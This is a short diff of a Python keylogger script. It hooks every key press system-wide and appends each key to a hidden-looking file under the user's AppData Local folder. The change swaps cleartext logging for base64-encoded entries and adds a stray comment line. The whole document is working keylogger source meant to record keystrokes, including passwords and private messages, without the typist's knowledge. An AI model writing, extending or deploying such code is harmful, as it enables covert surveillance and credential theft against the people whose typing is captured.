@@ -13,10 +13,12 @@ path = "C:\\Users\\{}\\AppData\\Local\\keylogs.txt".format(username)
 
 def keylogger(event):
     with open(path, 'a') as f:
-        f.write('{}\n'.format(event.name))
+        #f.write('{}\n'.format(event.name)) #This would save the keys in cleartext
         key = str(event.name)
         encoded = base64.b64encode(key.encode("UTF-8"))
         f.write('{}\n'.format(encoded))
 
 keyboard.on_press(keylogger)
 keyboard.wait()
+
+#Adding Custom Line
